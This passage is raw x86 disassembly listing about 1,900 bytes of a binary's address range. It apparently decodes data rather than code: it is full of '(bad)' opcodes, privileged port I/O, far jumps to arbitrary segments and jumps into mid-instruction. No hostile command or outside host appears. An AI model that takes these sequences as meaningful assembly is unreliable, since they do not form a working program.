  416c56:	pop    ebx
  416c57:	sar    BYTE PTR [edx],cl
  416c59:	out    0x4e,eax
  416c5b:	xchg   ebx,eax
  416c5c:	(bad)  
  416c5d:	out    dx,eax
  416c5e:	popa   
  416c5f:	stc    
  416c60:	aaa    
  416c61:	aaa    
  416c62:	fdivr  QWORD PTR [ecx+0x6e]
  416c65:	fsub   st,st(4)
  416c67:	jle    0x416cc3
  416c69:	dec    eax
  416c6a:	jge    0x416ca8
  416c6c:	xor    cl,al
  416c6e:	jbe    0x416c7d
  416c70:	sub    eax,0x882b159f
  416c75:	xor    BYTE PTR [ebx],ah
  416c77:	dec    ecx
  416c78:	test   al,0xa1
  416c7a:	test   eax,edx
  416c7c:	ins    BYTE PTR es:[edi],dx
  416c7d:	je     0x416cd7
  416c7f:	adc    DWORD PTR [eax+0x61b0c98],0x55
  416c86:	sahf   
  416c87:	xchg   DWORD PTR [esi-0x17a5c4ce],ebx
  416c8d:	cdq    
  416c8e:	dec    esp
  416c8f:	mov    ecx,0x461d8b67
  416c94:	lea    eax,[edx-0x2d231a45]
  416c9a:	jmp    0x416c64
  416c9c:	mov    BYTE PTR [esi-0x3dc12dc9],0xb5
  416ca3:	shl    DWORD PTR [ecx-0x17137785],cl
  416ca9:	or     BYTE PTR [ebx+0xbe9d615],dh
  416caf:	xlat   BYTE PTR ds:[ebx]
  416cb0:	hlt    
  416cb1:	or     BYTE PTR ds:0x581f3a0a,ch
  416cb7:	pop    es
  416cb8:	lock and bl,BYTE PTR [edx]
  416cbb:	mov    cl,0xd2
  416cbe:	xchg   DWORD PTR [esi+0x405e05b0],ebp
  416cc4:	mov    fs,eax
  416cc6:	leave  
  416cc7:	data16 mul dh
  416cca:	lods   eax,DWORD PTR ds:[esi]
  416ccb:	adc    BYTE PTR [ebx],ah
  416ccd:	push   edi
  416cce:	push   esp
  416ccf:	mul    BYTE PTR [ebp+0x4d]
  416cd2:	ins    DWORD PTR es:[edi],dx
  416cd3:	mov    eax,0xabf7cc16
  416cd8:	dec    ecx
  416cd9:	repnz pop esp
  416cdb:	ja     0x416cbd
  416cdd:	add    BYTE PTR [ecx+0x25],0x1
  416ce1:	and    cl,BYTE PTR [edi+0x25]
  416ce4:	mov    dh,0xd3
  416ce6:	xor    eax,DWORD PTR [eax+0x12]
  416ce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cea:	jmp    0xb6b8:0x2ec02d82
  416cf1:	pusha  
  416cf2:	inc    ch
  416cf4:	std    
  416cf5:	mov    ebp,0x4ce5f98e
  416cfa:	sahf   
  416cfb:	dec    edi
  416cfc:	fld    DWORD PTR [ebx+0x5d]
  416cff:	shr    al,1
  416d01:	mov    DWORD PTR [esi+0x29],ebp
  416d04:	sbb    esi,ebp
  416d06:	hlt    
  416d07:	or     al,al
  416d09:	ins    BYTE PTR es:[edi],dx
  416d0a:	int3   
  416d0b:	in     eax,0x86
  416d0d:	dec    ecx
  416d0e:	int    0xfb
  416d10:	pushf  
  416d11:	ret    0xa9be
  416d14:	adc    eax,0x3470e4ad
  416d19:	inc    ebp
  416d1a:	xchg   edi,eax
  416d1b:	pop    ebx
  416d1c:	mov    edx,0x5bed825c
  416d21:	xchg   esp,eax
  416d22:	sub    ch,BYTE PTR [ecx]
  416d24:	push   ebp
  416d25:	jnp    0x416d78
  416d27:	lock xchg edx,eax
  416d29:	sub    bl,ch
  416d2b:	jne    0x416cea
  416d2d:	dec    edx
  416d2e:	jb     0x416d74
  416d30:	jb     0x416da5
  416d32:	mov    ebx,0x237ec71f
  416d37:	jo     0x416d33
  416d39:	or     esp,DWORD PTR [esi-0x79]
  416d3c:	gs (bad) 
  416d3e:	sahf   
  416d3f:	xchg   DWORD PTR [ebx],esi
  416d41:	test   BYTE PTR [edi],dl
  416d43:	popa   
  416d44:	retf   0xd426
  416d47:	adc    eax,0xed424034
  416d4c:	call   0xd338:0x948e54f8
  416d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d54:	dec    ebx
  416d55:	das    
  416d56:	jno    0x416d20
  416d58:	aad    0x4f
  416d5a:	mov    dh,0x3d
  416d5c:	dec    ebp
  416d5d:	push   edi
  416d5e:	mov    ebp,esp
  416d60:	aad    0x9
  416d62:	pushf  
  416d63:	add    BYTE PTR [edx],0xba
  416d66:	cmp    dl,BYTE PTR [edi-0x3f]
  416d69:	and    WORD PTR [ebx-0x7b],dx
  416d6d:	sub    al,0x84
  416d6f:	adc    cl,bl
  416d71:	pop    es
  416d72:	ja     0x416dd2
  416d74:	xor    BYTE PTR [ecx*4+0x3ee7eaf8],al
  416d7b:	or     DWORD PTR [esi],ebp
  416d7d:	iret   
  416d7e:	loopne 0x416dbf
  416d80:	mov    ds:0x2ea289c6,al
  416d85:	das    
  416d86:	bnd jno 0x416dc1
  416d89:	mov    WORD PTR [esi],?
  416d8b:	cld    
  416d8c:	sbb    eax,DWORD PTR [ecx]
  416d8e:	test   ecx,ecx
  416d90:	inc    esi
  416d91:	jge    0x416dff
  416d93:	inc    ebp
  416d94:	arpl   si,bp
  416d96:	nop
  416d97:	jns    0x416de3
  416d99:	inc    ebx
  416d9a:	lock clc 
  416d9c:	xor    al,0x2a
  416d9e:	das    
  416d9f:	dec    eax
  416da0:	cmp    al,BYTE PTR [ebx+0x48102541]
  416da6:	xchg   BYTE PTR [edi],dl
  416da8:	clc    
  416da9:	push   ss
  416daa:	inc    edx
  416dab:	pop    esp
  416dac:	jb     0x416deb
  416dae:	inc    esp
  416daf:	or     DWORD PTR [ebx],0x80983e88
  416db5:	shr    DWORD PTR [esi+0xc6a2c4],1
  416dbb:	sbb    eax,0x52b6a274
  416dc0:	imul   esi,DWORD PTR [ecx],0xd493c4d8
  416dc6:	retf   0x2cca
  416dc9:	adc    eax,ebx
  416dcb:	sbb    dh,ch
  416dcd:	dec    ebp
  416dce:	repz rol BYTE PTR [ecx],1
  416dd1:	jp     0x416dd1
  416dd3:	aad    0x24
  416dd5:	ret    
  416dd6:	mov    ds:0xb9768afa,eax
  416ddb:	jnp    0x416d88
  416ddd:	or     eax,edx
  416ddf:	lds    eax,FWORD PTR [edi-0x43]
  416de2:	ret    
  416de3:	or     BYTE PTR [eax-0x7a],bl
  416de6:	outs   dx,DWORD PTR ds:[esi]
  416de7:	add    DWORD PTR [eax+0x4f],eax
  416dea:	out    0x6e,al
  416dec:	mov    ebx,0x8db083bb
  416df1:	loope  0x416e59
  416df3:	sub    eax,0xdc228c29
  416df8:	inc    eax
  416df9:	sub    DWORD PTR [ecx-0x10],0x75ed56f5
  416e00:	push   es
  416e01:	data16 jp 0x416e79
  416e04:	fcmovnb st,st(1)
  416e06:	cmp    cl,al
  416e08:	cmp    esp,DWORD PTR [ebp+0x9]
  416e0b:	mov    ecx,0xaecaa945
  416e10:	inc    edx
  416e11:	and    BYTE PTR [ebx],0xc0
  416e14:	test   eax,0xa38a4033
  416e19:	imul   BYTE PTR [eax+0x758a6b81]
  416e1f:	mov    ecx,0x3bb19338
  416e24:	add    edi,esi
  416e26:	nop
  416e27:	dec    edi
  416e28:	xlat   BYTE PTR ds:[ebx]
  416e29:	xor    DWORD PTR [eax-0x59fce7ad],0x885457a
  416e33:	stos   BYTE PTR es:[edi],al
  416e34:	xchg   esi,eax
  416e35:	lea    edx,[eax-0x58]
  416e38:	inc    edi
  416e39:	adc    BYTE PTR [ebp+0x4e],ch
  416e3c:	adc    eax,0x7ea404a8
  416e41:	push   edx
  416e42:	add    BYTE PTR [eax-0x1e1cafb5],cl
  416e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e49:	adc    eax,0x5c8f7821
  416e4e:	and    eax,0x326b27a5
  416e53:	lods   al,BYTE PTR ds:[esi]
  416e54:	sbb    ch,dl
  416e56:	inc    eax
  416e57:	cld    
  416e58:	dec    ebp
  416e59:	ss ds push edi
  416e5c:	dec    edx
  416e5d:	stos   DWORD PTR es:[edi],eax
  416e5e:	jo     0x416ec5
  416e60:	mov    eax,0xd81df2d6
  416e65:	xchg   ebx,eax
  416e66:	ficom  DWORD PTR [ebp+0x3518af8e]
  416e6c:	shl    DWORD PTR [edi],1
  416e6e:	lock cmp ebx,edi
  416e71:	xchg   ecx,eax
  416e72:	inc    edi
  416e73:	mov    bl,0x5a
  416e75:	xchg   ebx,eax
  416e76:	pop    ebp
  416e77:	std    
  416e78:	clc    
  416e79:	or     cl,BYTE PTR [edx+0x5aece622]
  416e7f:	mov    edx,0x2f8ee50b
  416e84:	test   al,0x30
  416e86:	mov    bl,ch
  416e88:	pop    ds
  416e89:	stc    
  416e8a:	dec    ebp
  416e8b:	call   0x9a70699b
  416e90:	xchg   ebx,eax
  416e91:	mov    ch,0x91
  416e93:	cmp    ah,BYTE PTR [eax+0x36cb00dd]
  416e99:	xchg   dh,dh
  416e9b:	dec    esp
  416e9c:	and    edx,DWORD PTR [edi+esi*4]
  416e9f:	add    al,0xa1
  416ea1:	loope  0x416e53
  416ea3:	dec    esi
  416ea4:	push   esi
  416ea5:	aam    0xe8
  416ea7:	dec    esi
  416ea8:	les    eax,FWORD PTR [edx-0x2ecd107b]
  416eae:	cmp    al,0x8c
  416eb0:	cmp    cl,bh
  416eb2:	xchg   ebx,eax
  416eb3:	mov    bx,ax
  416eb6:	ret    0xfa56
  416eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416eba:	(bad)  
  416ebb:	push   0x65
  416ebd:	sub    eax,0x98e7ed90
  416ec2:	adc    esp,ecx
  416ec4:	or     ah,BYTE PTR [eax-0x76c31f0a]
  416eca:	xor    BYTE PTR [edx+ebp*1-0x62],cl
  416ece:	fstp   TBYTE PTR [eax]
  416ed0:	adc    ecx,DWORD PTR [esi-0x1f]
  416ed3:	mov    ecx,0x4f1046e
  416ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ed9:	push   ecx
  416eda:	and    ecx,esi
  416edc:	adc    al,0x1e
  416ede:	and    al,0xbc
  416ee0:	je     0x416f4d
  416ee2:	aad    0xbb
  416ee4:	ja     0x416ebd
  416ee6:	and    ah,dl
  416ee8:	add    eax,0x2ba9eff0
  416eed:	rcl    BYTE PTR ds:0x3e31261a,0x91
  416ef4:	sub    bl,al
  416ef6:	fnstsw WORD PTR [esi-0x7d5a5dc5]
  416efc:	mov    eax,0xb49bf5be
  416f01:	imul   esi,DWORD PTR [esi-0x4b],0xca94594b
  416f08:	sti    
  416f09:	adc    eax,0xace2ab9d
  416f0e:	adc    eax,0x3adeed1d
  416f13:	fbstp  TBYTE PTR [bp+0x63]
  416f17:	jle    0x416f75
  416f19:	pop    ds
  416f1a:	repnz push ebp
  416f1c:	push   cs
  416f1d:	push   ss
  416f1e:	dec    edi
  416f1f:	pop    ebp
  416f20:	jmp    0xf9b8:0x9423
  416f26:	jle    0x416f5e
  416f28:	repnz inc esp
  416f2a:	mul    DWORD PTR [ebx+0x43]
  416f2d:	repz jb 0x416f0a
  416f30:	into   
  416f31:	iret   
  416f32:	cmp    DWORD PTR [eax-0x13981a6c],edi
  416f38:	push   eax
  416f39:	cwde   
  416f3a:	int    0x84
  416f3c:	in     eax,dx
  416f3d:	dec    DWORD PTR [ecx+eax*8]
  416f40:	jge    0x416f59
  416f42:	mov    BYTE PTR [ecx+0x42156a7b],dh
  416f48:	int    0x3d
  416f4a:	jne    0x416fa8
  416f4c:	es pop esi
  416f4e:	stos   BYTE PTR es:[edi],al
  416f4f:	in     eax,0x1f
  416f51:	sub    ebp,DWORD PTR [edi+0x143bfd9]
  416f57:	ins    DWORD PTR es:[edi],dx
  416f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f59:	and    DWORD PTR [edi-0x1bbee7a8],ecx
  416f5f:	ror    esi,1
  416f61:	div    DWORD PTR [ecx+eiz*8]
  416f64:	mov    eax,ds:0xe3ec152a
  416f69:	cmp    edx,DWORD PTR [ebp+0x12a2d257]
  416f6f:	dec    esp
  416f70:	push   cs
  416f71:	lods   eax,DWORD PTR ds:[esi]
  416f72:	push   eax
  416f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f74:	inc    edx
  416f75:	or     edx,DWORD PTR [ebx-0x7562f9f9]
  416f7b:	sbb    esi,ebp
  416f7d:	mov    edi,0x1163d648
  416f82:	or     DWORD PTR [edx],esp
  416f84:	xchg   ebp,eax
  416f85:	rcl    DWORD PTR [esi],1
  416f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f88:	inc    ebx
  416f89:	cld    
  416f8a:	mov    eax,DWORD PTR [esi+0x35]
  416f8d:	outs   dx,DWORD PTR ds:[esi]
  416f8e:	popa   
  416f8f:	xor    al,0x6e
  416f91:	(bad)  
  416f92:	icebp  
  416f93:	loope  0x416f32
  416f95:	jl     0x416ff9
  416f97:	mov    al,ds:0xf91ec868
  416f9c:	push   0xfffffffa
  416f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f9f:	jbe    0x416f66
  416fa1:	repz pop edi
  416fa3:	shl    esi,1
  416fa5:	push   es
  416fa6:	aas    
  416fa7:	popf   
  416fa8:	mov    bl,0x56
  416faa:	inc    edi
  416fab:	rcr    BYTE PTR [edx],cl
  416fad:	hlt    
  416fae:	scas   eax,DWORD PTR es:[edi]
  416faf:	aas    
  416fb0:	xlat   BYTE PTR ds:[ebx]
  416fb1:	push   esp
  416fb2:	les    ecx,FWORD PTR [ecx+0x28]
  416fb5:	lods   eax,DWORD PTR ds:[esi]
  416fb6:	cmp    BYTE PTR [esi+ebp*4+0x2fc46f73],0x59
  416fbe:	inc    esi
  416fbf:	test   al,0x75
  416fc1:	scas   eax,DWORD PTR es:[edi]
  416fc2:	fsub   DWORD PTR [ecx-0x6d7ba01]
  416fc8:	or     al,0x45
  416fca:	lea    ebx,[ecx+0x6]
  416fcd:	add    dh,bh
  416fcf:	xchg   ebp,eax
  416fd0:	pop    ebx
  416fd1:	jb     0x416fcf
  416fd3:	stos   DWORD PTR es:[edi],eax
  416fd4:	or     DWORD PTR gs:[esp+edx*2-0x49],0x19
  416fda:	sbb    BYTE PTR [ebp+0x5536cdf1],0xd3
  416fe1:	jg     0x416f9e
  416fe3:	mov    dl,0x86
  416fe5:	or     ah,BYTE PTR [ecx+0x580898d8]
  416feb:	mul    edx
  416fed:	adc    eax,0x194fbfaa
  416ff2:	jg     0x417073
  416ff4:	mov    bl,0xbb
  416ff6:	xchg   edx,eax
  416ff7:	mov    DWORD PTR [ecx+0x63],edx
  416ffa:	or     edi,eax
  416ffc:	dec    eax
  416ffd:	rol    BYTE PTR [esi-0x2e],0x95
  417001:	mov    al,0xf5
  417003:	or     ch,ah
  417005:	inc    ebx
  417006:	sub    BYTE PTR [ecx-0x47],0xec
  41700a:	enter  0x4b0,0x16
  41700e:	add    al,0x49
  417010:	dec    eax
  417011:	xchg   edx,eax
  417012:	sub    BYTE PTR [ecx],al
  417014:	mov    esi,0x664f3d6f
  417019:	push   ebx
  41701a:	mov    ebx,0xeb3a143
  41701f:	xchg   DWORD PTR [edx+edx*2+0x761ee517],ebx
  417026:	push   edi
  417027:	popa   
  417028:	out    dx,eax
  417029:	sub    DWORD PTR [ebx-0x2],0x5eadbb4d
  417030:	jge    0x416ff3
  417032:	cdq    
  417033:	and    DWORD PTR [edx+0x6d],ebx
  417036:	xchg   esp,eax
  417037:	jbe    0x417002
  417039:	pop    edi
  41703a:	pop    ecx
  41703b:	(bad)  
  41703c:	dec    edi
  41703e:	dec    esi
  41703f:	add    ebp,ebp
  417041:	pop    esp
  417042:	xor    ecx,eax
  417044:	inc    edx
  417045:	cmp    DWORD PTR [edi],esp
  417047:	xor    bl,BYTE PTR [edx+edx*8-0x252ea454]
  41704e:	jl     0x4170b1
  417050:	inc    eax
  417051:	xchg   esp,eax
  417052:	jb     0x41700a
  417054:	arpl   di,bx
  417056:	scas   eax,DWORD PTR es:[edi]
  417057:	inc    esp
  417058:	push   ds
  417059:	xchg   edi,eax
  41705a:	or     edi,DWORD PTR ds:0xda5da19c
  417060:	jmp    0x1e532ab5
  417065:	es sahf 
  417067:	or     DWORD PTR ds:0xe7ff033e,esp
  41706d:	cmp    ah,cl
  41706f:	repz mov ebp,0x48535665
  417075:	mov    ah,0x5b
  417077:	cmp    ah,bh
  417079:	mov    fs,WORD PTR [ecx+0x79]
  41707c:	mov    dl,0xf4
  41707e:	sahf   
  41707f:	cdq    
  417080:	(bad)  
  417081:	dec    ebp
  417082:	out    0x9e,al
  417084:	stc    
  417085:	lods   al,BYTE PTR ds:[esi]
  417086:	out    0x3d,al
  417088:	call   0xac3217a1
  41708d:	das    
  41708e:	jmp    0x28f00355
  417093:	sti    
  417094:	shl    dl,1
  417096:	and    ebx,DWORD PTR [ebp+0x7e]
  417099:	jp     0x417078
  41709b:	into   
  41709c:	and    BYTE PTR [ecx+0x29],ch
  41709f:	stos   DWORD PTR es:[edi],eax
  4170a0:	mov    ebp,0x321232fa
  4170a5:	in     eax,dx
  4170a6:	adc    DWORD PTR [esi+esi*4],ebp
  4170a9:	and    dl,BYTE PTR [eax+ebx*2]
  4170ac:	add    eax,0x6c0c2d61
  4170b1:	cli    
  4170b2:	jne    0x41705d
  4170b4:	lock and BYTE PTR [ebp+0x39],cl
  4170b8:	jge    0x4170ed
  4170ba:	pop    esp
  4170bb:	add    eax,0x6831b59f
  4170c0:	push   ds
  4170c1:	test   DWORD PTR [ebx],eax
  4170c3:	push   ebp
  4170c4:	not    DWORD PTR [edi-0x31]
  4170c7:	jae    0x4170d5
  4170c9:	test   DWORD PTR [ecx-0x67],edi
  4170cc:	les    ebx,FWORD PTR [esi-0x231f7a3f]
  4170d2:	je     0x41707e
  4170d4:	mov    ecx,0xc22a5a7
  4170d9:	dec    ecx
  4170da:	xchg   BYTE PTR [ebx+0x245a5cb4],dl
  4170e0:	fmul   st,st(7)
  4170e2:	xchg   DWORD PTR [ecx],edx
  4170e4:	mov    bl,0xf4
  4170e6:	sbb    ebp,DWORD PTR [ecx]
  4170e8:	ret    
  4170e9:	mul    cl
  4170eb:	inc    ebx
  4170ec:	mov    ds:0x5600a06b,eax
  4170f1:	push   0x786473f5
  4170f6:	je     0x4170ab
  4170f8:	mov    al,0x69
  4170fa:	xlat   BYTE PTR ds:[ebx]
  4170fb:	mov    esp,0x12886d3d
  417100:	push   eax
  417101:	xchg   DWORD PTR [ebp+0xb6fd834],edx
  417107:	xchg   ecx,eax
  417108:	popa   
  417109:	push   ecx
  41710a:	cwde   
  41710b:	xor    DWORD PTR [edx-0x38],ebp
  41710e:	in     eax,dx
  41710f:	pop    ss
  417110:	jmp    0x1f09:0x45ce02b1
  417117:	mov    cl,0x1
  417119:	(bad)  
  41711a:	mov    eax,ds:0xde8e6ee2
  41711f:	push   cs
  417120:	inc    ecx
  417121:	mov    WORD PTR [edi+0x101378a0],ds
  417127:	xor    al,0x60
  417129:	mov    ebx,DWORD PTR [eax]
  41712b:	pop    edi
  41712c:	in     eax,dx
  41712d:	in     eax,dx
  41712e:	and    cl,BYTE PTR [esi+ecx*4-0x4f]
  417132:	add    al,0x3d
  417134:	push   ds
  417135:	mov    dl,0x5a
  417137:	sub    al,0x36
  417139:	or     esi,DWORD PTR [eax-0x5d83b213]
  41713f:	mov    eax,ds:0xed1a80f1
  417144:	popf   
  417145:	mov    WORD PTR fs:[ecx-0x6a],?
  417149:	cmp    DWORD PTR [edx+0x2e7aa161],esi
  41714f:	mov    ecx,0xe552a20d
  417154:	pop    edi
  417155:	fdivp  st(1),st
  417157:	shr    BYTE PTR [ecx],0xa5
  41715a:	loop   0x417108
  41715c:	popf   
  41715d:	mov    al,0xc6
  41715f:	cs or  ebp,ebp
  417162:	xchg   esi,eax
  417163:	idiv   BYTE PTR [ebp-0x28acca65]
  417169:	adc    al,0x4
  41716b:	mov    bl,0x16
  41716d:	xchg   DWORD PTR ds:0x678dce1e,ebp
  417173:	jb     0x41718a
  417175:	xchg   esi,eax
  417176:	cli    
  417177:	xchg   esi,eax
  417178:	jbe    0x4171e4
  41717a:	fsub   QWORD PTR [ebx-0x4f]
  41717d:	xor    eax,0xde7a67af
  417182:	ins    BYTE PTR es:[edi],dx
  417183:	not    DWORD PTR [edx+0x4b23f8a4]
  417189:	push   edx
  41718a:	xor    ch,bl
  41718c:	scas   al,BYTE PTR es:[edi]
  41718d:	cmp    edx,ebp
  41718f:	or     eax,0xba4cfa40
  417194:	gs ret 
  417196:	cmp    dh,BYTE PTR [esi+0x61]
  417199:	mov    esp,0x1b1b4c72
  41719e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41719f:	jae    0x417131
  4171a1:	outs   dx,DWORD PTR ds:[esi]
  4171a2:	loope  0x4171b5
  4171a4:	mov    edx,ss
  4171a6:	dec    edx
  4171a7:	fldl2t 
  4171a9:	dec    edi
  4171aa:	xor    al,BYTE PTR [esp+edi*2-0x80]
  4171ae:	inc    ebp
  4171af:	sbb    al,0xfb
  4171b1:	jp     0x417229
  4171b3:	push   0x58
  4171b5:	ret    
  4171b6:	pop    eax
  4171b7:	cli    
  4171b8:	test   BYTE PTR [esi],dl
  4171ba:	iret   
  4171bb:	sahf   
  4171bc:	dec    eax
  4171bd:	stos   BYTE PTR es:[edi],al
  4171be:	test   al,0x5c
  4171c0:	ss pop esi
  4171c2:	mov    ch,ah
  4171c4:	and    BYTE PTR ds:0xf6d68b44,bl
  4171cb:	push   ss
  4171cc:	(bad)  
  4171cd:	sub    DWORD PTR [esi+0x5e],ecx
  4171d0:	sub    ah,BYTE PTR ds:0x444fbb0e
  4171d6:	out    dx,eax
  4171d7:	push   eax
  4171d8:	mov    ds:0x4f054a63,al
  4171dd:	sub    BYTE PTR [ebx],cl
  4171df:	std    
  4171e0:	push   ss
  4171e1:	push   ebx
  4171e2:	call   0xc8692fa1
  4171e7:	cmp    al,BYTE PTR [ecx-0x2d]
  4171ea:	sub    DWORD PTR [ebx],esi
  4171ec:	mov    DWORD PTR [ebp+0x450bae4c],esi
  4171f2:	imul   ebx,DWORD PTR [esi+0x1ab81478],0x6c637a42
  4171fc:	fisubr WORD PTR ds:0x1a8dd553
  417202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417204:	jb     0x417205
  417206:	push   eax
  417207:	or     al,0x57
  417209:	xor    eax,0x6a381e4f
  41720e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41720f:	add    cl,BYTE PTR [eax-0x63a6c8f6]
  417215:	nop    ebx
  417218:	outs   dx,DWORD PTR ds:[esi]
  417219:	push   0x5b874f93
  41721e:	dec    ebx
  41721f:	adc    eax,DWORD PTR [ebx+0x7b]
  417222:	lods   al,BYTE PTR ss:[esi]
  417224:	sar    DWORD PTR ds:0xa8c953d2,0xe
  41722b:	in     al,0x45
  41722d:	loope  0x417260
  41722f:	jg     0x4171b1
  417231:	mov    cs,WORD PTR ds:[ebx-0xbc3fb1]
  417238:	test   eax,0x5e23bed3
  41723d:	jecxz  0x417275
  41723f:	ins    DWORD PTR es:[edi],dx
  417240:	aad    0x2c
  417242:	xchg   edi,eax
  417243:	js     0x417205
  417245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417246:	stos   DWORD PTR es:[edi],eax
  417247:	(bad)  
  417248:	outs   dx,BYTE PTR ds:[esi]
  417249:	xor    al,0xeb
  41724b:	das    
  41724c:	aam    0x8e
  41724e:	add    BYTE PTR [edi+0x1f],dh
  417251:	rol    DWORD PTR [edi+0x702d402d],1
  417257:	scas   eax,DWORD PTR es:[edi]
  417258:	repnz iret 
  41725a:	dec    ebx
  41725b:	dec    edi
  41725c:	xor    esi,eax
  41725e:	mov    dl,BYTE PTR [eax-0x12f544ad]
  417264:	in     al,dx
  417265:	xchg   ecx,eax
  417266:	(bad)  
  417267:	sub    DWORD PTR [ebx],esi
  417269:	int3   
  41726a:	push   es
  41726b:	inc    esp
  41726c:	fbstp  TBYTE PTR [ebx+0x2]
  41726f:	inc    eax
  417270:	call   0xb9ec7d2d
  417275:	xchg   ecx,eax
  417276:	sub    edx,DWORD PTR [ebx+0x4aa499ba]
  41727c:	mov    BYTE PTR [ecx],al
  41727e:	push   edi
  41727f:	mov    BYTE PTR [ebx+edi*8+0x7a],al
  417283:	or     BYTE PTR ds:0x66c1104d,ah
  417289:	je     0x41726f
  41728b:	ins    BYTE PTR es:[edi],dx
  41728c:	mov    ebx,0x73adab08
  417291:	add    eax,DWORD PTR [edx-0x23]
  417294:	(bad)  
  417295:	loope  0x417304
  417297:	jne    0x417317
  417299:	mov    esp,0x81fd567b
  41729e:	outs   dx,DWORD PTR ds:[esi]
  41729f:	out    dx,eax
  4172a0:	fwait
  4172a1:	xchg   ecx,eax
  4172a2:	and    al,BYTE PTR [edi+ebx*1]
  4172a5:	adc    esi,DWORD PTR [eax-0x7e]
  4172a8:	loopne 0x417254
  4172aa:	inc    esi
  4172ab:	xchg   ebp,eax
  4172ac:	or     bl,ah
  4172ae:	and    DWORD PTR [eax],edi
  4172b0:	cmp    ecx,DWORD PTR [esi]
  4172b2:	sub    DWORD PTR [ebp-0x2b],edi
  4172b5:	das    
  4172b6:	add    DWORD PTR [ecx+edi*2-0x5f],esi
  4172ba:	sbb    al,0xa9
  4172bc:	ins    DWORD PTR es:[edi],dx
  4172bd:	jecxz  0x4172f1
  4172bf:	outs   dx,BYTE PTR ds:[esi]
  4172c0:	dec    edi
  4172c1:	call   0x446a:0x7e0d79a0
  4172c8:	jns    0x4172f7
  4172ca:	jmp    esp
  4172cc:	mov    ah,0xe3
  4172ce:	mov    edx,0x63cc931e
  4172d3:	push   esi
  4172d4:	into   
  4172d5:	mov    ds:0x773643f4,eax
  4172da:	sbb    eax,0x5e0fcbdc
  4172df:	xchg   edx,eax
  4172e0:	fimul  DWORD PTR [eax-0x27]
  4172e3:	xor    ebp,DWORD PTR [esp+eax*8-0x5]
  4172e7:	int3   
  4172e8:	leave  
  4172e9:	or     eax,0x23eff48e
  4172ee:	pop    ebp
  4172ef:	outs   dx,DWORD PTR ds:[esi]
  4172f0:	pusha  
  4172f1:	shl    DWORD PTR [ebp+0x2433e90c],0xb2
  4172f8:	push   ecx
  4172f9:	ret    0x62e6
  4172fc:	outs   dx,BYTE PTR ds:[esi]
  4172fd:	aad    0x68
  4172ff:	call   0x14f2:0x7ab11c1e
  417306:	sbb    edx,DWORD PTR [edx]
  417308:	mov    ax,0xa428
  41730c:	sub    al,0x98
  41730e:	(bad)  
  41730f:	in     al,0xfe
  417311:	add    eax,0x5ac830f5
  417316:	std    
  417317:	xchg   DWORD PTR ds:0x2fb769d9,esp
  41731d:	adc    ebp,DWORD PTR ds:0xfc8a27ac
  417323:	imul   esi,DWORD PTR [eax+0x5bba643b],0x9fdccfde
  41732d:	leave  
  41732e:	leave  
  41732f:	mov    edi,0x2581ed82
  417334:	popf   
  417335:	jl     0x41734b
  417337:	clc    
  417338:	mov    ah,0x93
  41733a:	sub    edi,DWORD PTR [ecx]
  41733c:	cld    
  41733d:	add    al,BYTE PTR [ebx+eiz*4]
  417340:	mov    edi,0xfe95332b
  417345:	push   cs
  417346:	dec    edi
  417347:	in     eax,0xe8
  417349:	hlt    
  41734a:	xchg   edx,eax
  41734b:	add    eax,0x9e9d42c
  417350:	clc    
  417351:	icebp  
  417352:	aas    
  417353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417354:	repz pop ebx
  417356:	push   ebx
  417357:	and    cl,BYTE PTR [edx+edi*8-0x6c399e17]
  41735e:	sub    eax,0xb0040d92
  417363:	sub    al,0xfa
  417365:	sar    BYTE PTR [eax-0x81e6b5c],1
  41736b:	imul   esp,DWORD PTR [eax+0x63],0xffffffd9
  41736f:	fisub  WORD PTR [eax]
  417371:	dec    esi
  417372:	imul   esp,DWORD PTR [edx-0x3b],0xfffffff1
  417376:	stc    
  417377:	(bad)  
  417378:	mov    esi,0xeb743d63
  41737d:	cmp    al,0x6
  41737f:	shr    BYTE PTR [edi],0x16
  417382:	add    eax,0x532352fe
  417387:	into   
  417388:	jp     0x4173d6
  41738a:	pop    ebx
  41738b:	pushf  
  41738c:	xchg   ecx,eax
  41738d:	push   ebp
  41738e:	out    0x6b,al
  417390:	into   
  417391:	pusha  
  417392:	push   esi
  417393:	lahf   
  417394:	pop    esp
  417395:	aas    
  417396:	arpl   WORD PTR [ebx+0x584aa58],dx
  41739c:	mov    ds:0x6b73c6a6,eax
  4173a1:	push   0x2848d172
  4173a6:	and    dh,BYTE PTR [edi-0x36]
  4173a9:	sti    
  4173aa:	push   ss
  4173ab:	push   ds
  4173ac:	adc    al,0x89
  4173ae:	mov    ecx,0xe4fb883a
  4173b3:	fwait
  4173b4:	add    eax,0x47a6695a
  4173b9:	mov    cl,0xbf
  4173bb:	mov    ecx,0xcee9c04b
  4173c0:	pusha  
  4173c1:	xchg   esp,eax
  4173c2:	cmp    edi,DWORD PTR [edi+0x66a31b]
  4173c8:	stc    
  4173c9:	icebp  
  4173ca:	lds    edx,FWORD PTR [edx-0x3602c86b]
  4173d0:	dec    eax
  4173d1:	sbb    al,0xc5
  4173d3:	adc    dh,BYTE PTR [edx]
  4173d5:	das    
  4173d6:	or     dl,BYTE PTR [edi-0x63e5519d]
  4173dc:	xor    DWORD PTR [edx+0x58bfdd3c],ebp
  4173e2:	test   eax,0xc0ae27ea
  4173e7:	cdq    
  4173e8:	add    al,0xe
  4173ea:	pop    ebp
  4173eb:	adc    BYTE PTR [eax-0x3b],dl
  4173ee:	jne    0x417458
  4173f0:	leave  
  4173f1:	int    0x6c
  4173f3:	pop    edx
  4173f4:	or     BYTE PTR fs:[ebx+0x2e],cl
